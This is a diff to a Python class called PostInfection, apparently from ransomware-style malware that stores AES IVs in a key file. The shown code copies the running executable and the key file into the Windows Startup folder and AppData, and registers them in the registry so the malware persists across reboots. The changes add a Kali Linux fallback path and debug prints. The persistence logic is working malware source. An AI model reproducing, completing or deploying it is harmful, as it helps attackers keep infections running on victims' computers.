@@ -57,6 +57,7 @@ class PostInfection(object):
             _startup_location = _user_profile + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
             #_startup_location_2 = os.environ["APPDATA"]+"\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp"
         except:
+            _user_profile = "/home/kali"
             _startup_location = "/home/kali/Desktop/Startup"
 
         aptal_path = sys.argv[0]
@@ -67,12 +68,14 @@ class PostInfection(object):
             # copy aptal.exe because it is coming with gui
             _startup_aptal_path = os.path.join(_startup_location,os.path.basename(sys.argv[0]))
             copyfile(aptal_path, _startup_aptal_path)
+            print("startup aptal file ::", _startup_aptal_path)
 
         # copy file which consists of aes IVs 
         _startup_key_file_path = os.path.join(_startup_location,os.path.basename(aesIV_file_store_path))
         copyfile(aesIV_file_store_path, _startup_key_file_path)
+        print("startup key file ::", _startup_key_file_path)
 
-        
+
         if _startup_location != "/home/kali/Desktop/Startup":
             import winreg
             _regedit_temp = _user_profile + "\\AppData\\Local"
@@ -80,11 +83,13 @@ class PostInfection(object):
             _regedit_key_file_path = os.path.join(_regedit_temp, os.path.basename(aesIV_file_store_path))
             copyfile(aesIV_file_store_path,_regedit_key_file_path)
             self.addToRegistry("aptaltxt", _regedit_key_file_path)
+            print("regedit key file ::", _regedit_key_file_path)
             if self.mode == "online":
                 # copy gui file for regedit
                 _regedit_aptal_path = os.path.join(_regedit_temp, os.path.basename(sys.argv[0]))
                 copyfile(aptal_path, _regedit_aptal_path)
                 self.addToRegistry("aptalgui", _regedit_key_file_path)
+                print("regedit aptal file ::", _regedit_aptal_path)
                 
 
 
